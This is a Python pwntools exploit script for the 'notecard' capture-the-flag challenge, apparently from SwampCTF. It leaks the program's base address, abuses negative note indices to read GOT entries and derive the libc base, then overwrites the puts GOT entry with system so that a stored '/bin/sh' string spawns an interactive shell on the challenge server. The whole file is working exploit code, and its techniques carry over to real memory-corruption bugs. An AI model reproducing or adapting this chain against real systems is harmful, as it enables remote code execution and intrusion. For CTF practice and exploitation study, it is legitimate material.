#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './notecard_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "chals.swampctf.com", 40002

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    # breakrva 0x13c7
    # breakrva 0x13bb
    # breakrva 0x1301
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def view(idx):
    io.sendlineafter("> \n", b"1")
    io.sendlineafter(": ", str(idx).encode())

def write(idx, data):
    io.sendlineafter("> \n", b"2")
    io.sendlineafter(": ", str(idx).encode())
    io.send(data)

def exploit():
    global io
    io = initialize()
    with log.progress("Leak elf address"), context.silent:
        io.sendlineafter(":\n", cyclic(0x18 - 1) + b"|")
        io.sendlineafter("?\n", "n")
        io.recvuntil("|")
        elf.address = u64(io.recvline().strip()[:-1].ljust(8, b"\x00")) - 0x1270
    log.info("ELF base %#x", elf.address)
    with log.progress("Make fake table and leak libc address"), context.silent:
        write(4, b"/bin/sh\0" + p64(elf.got["gets"]) + p64(elf.got["read"]) + p64(elf.got["printf"]) + p64(elf.got["puts"]))
        view(-2)
        puts = u64(io.recvline().strip().ljust(8, b"\x00"))
        view(-3)
        printf = u64(io.recvline().strip().ljust(8, b"\x00"))
        view(-4)
        read = u64(io.recvline().strip().ljust(8, b"\x00"))
        view(-5)
        gets = u64(io.recvline().strip().ljust(8, b"\x00"))
        libc.address = puts - libc.sym["puts"]
    log.info("puts %#x", puts)
    log.info("read %#x", read)
    log.info("printf %#x", printf)
    log.info("gets %#x", gets)
    log.info("Libc base %#x", libc.address)
    write(-2, p64(libc.sym["system"]))
    view(4)
    io.interactive()

if __name__ == '__main__':
    exploit()
